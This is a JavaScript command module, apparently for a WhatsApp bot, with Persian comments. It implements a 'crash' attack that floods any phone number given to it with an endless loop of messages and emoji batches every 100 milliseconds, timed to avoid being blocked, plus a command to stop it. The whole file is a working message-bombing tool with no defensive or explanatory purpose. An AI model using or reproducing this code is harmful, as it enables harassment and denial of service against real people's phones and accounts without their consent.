import fs from "fs";
import path from "path";
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// مسیر فایل لیست پیام‌ها
const CRASH_FILE_PATH = path.join(__dirname, "../data/crash_messages.txt");

// ذخیره وضعیت کرشرهای فعال
global.activeCrashers = global.activeCrashers || {};

/**
 * لیست ایموجی‌های سنگین و محبوب برای ایجاد لگ
 */
const heavyEmojis = ["🔥", "💯", "😂", "🤣", "💀", "👻", "🎉", "✨"];

async function readCrashFile() {
    try {
        if (!fs.existsSync(CRASH_FILE_PATH)) {
            fs.writeFileSync(CRASH_FILE_PATH, "سلام\nکرش شدی؟\nپیام تست\n");
        }
        const data = await fs.promises.readFile(CRASH_FILE_PATH, 'utf-8');
        return data.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("خطا در خواندن فایل:", error);
        return [];
    }
}

export default async function crashCommand(sock, from, body, m, args) {
    let target = args[0];
    if (!target) {
        await sock.sendMessage(from, { text: "❌ شماره را وارد کنید.\n!pgr crash 93794384087" }, { quoted: m });
        return;
    }

    // پاکسازی شماره
    target = target.replace(/^\+|00/g, '');
    const chatId = `${target}@c.us`;

    if (global.activeCrashers[chatId]) {
        await sock.sendMessage(from, { text: "⚠️ کرشر در حال اجراست." }, { quoted: m });
        return;
    }

    try {
        const messages = await readCrashFile();
        if (messages.length === 0) {
            await sock.sendMessage(from, { text: "❌ فایل پیام خالی است." }, { quoted: m });
            return;
        }

        console.log(`🚀 شروع Super Crash به: ${target}`);
        
        // تنظیمات سرعت و تعداد
        const SPEED_MS = 100; // هر ۱۰۰ میلی‌ثانیه یک پیام (خیلی سریع)
        const BATCH_SIZE = 5; // ارسال ۵ پیام پشت سر هم قبل از وقفه کوتاه

        global.activeCrashers[chatId] = { stop: false, interval: null };
        
        await sock.sendMessage(from, { text: `🔥 کرشر فعال شد! سرعت: بالا` }, { quoted: m });

        const startSuperCrash = async () => {
            let msgIndex = 0;
            
            // حلقه بی‌نهایت کنترل شده
            while (!global.activeCrashers[chatId].stop) {
                
                for (let i = 0; i < BATCH_SIZE; i++) {
                    if (global.activeCrashers[chatId].stop) break;

                    // انتخاب تصادفی بین متن و ایموجی سنگین برای تنوع
                    const useEmoji = Math.random() > 0.7; 
                    let msgText = "";

                    if (useEmoji) {
                        // ترکیب چند ایموجی سنگین
                        const randomEmojis = heavyEmojis.sort(() => 0.5 - Math.random()).slice(0, 3);
                        msgText = randomEmojis.join(" ");
                    } else {
                        msgText = messages[msgIndex % messages.length];
                        msgIndex++;
                    }

                    try {
                        await sock.sendMessage(chatId, { text: msgText }, { quoted: m });
                    } catch (error) {
                        if (error.message.includes('timeout') || error.message.includes('not-authorized')) {
                            global.activeCrashers[chatId].stop = true;
                            await sock.sendMessage(from, { text: `⛔ متوقف شد: ${error.message}` }, { quoted: m });
                            return;
                        }
                    }
                }

                // وقفه کوتاه بعد از هر دسته برای جلوگیری از بلاک شدن فوری
                await new Promise(resolve => setTimeout(resolve, SPEED_MS));
            }
        };

        startSuperCrash();

    } catch (error) {
        console.error("خطای کلی:", error);
        await sock.sendMessage(from, { text: "❌ خطا." }, { quoted: m });
    }
}

export async function stopCrash(sock, from, body, m, args) {
    let target = args[0];
    if (target) {
        target = target.replace(/^\+|00/g, '');
        const chatId = `${target}@c.us`;
        if (global.activeCrashers[chatId]) {
            global.activeCrashers[chatId].stop = true;
            await sock.sendMessage(from, { text: `✅ کرشر ${target} متوقف شد.` }, { quoted: m });
            delete global.activeCrashers[chatId];
        }
    } else {
        let count = 0;
        for (const key in global.activeCrashers) {
            global.activeCrashers[key].stop = true;
            count++;
            delete global.activeCrashers[key];
        }
        await sock.sendMessage(from, { text: `✅ ${count} کرشر متوقف شد.` }, { quoted: m });
    }
}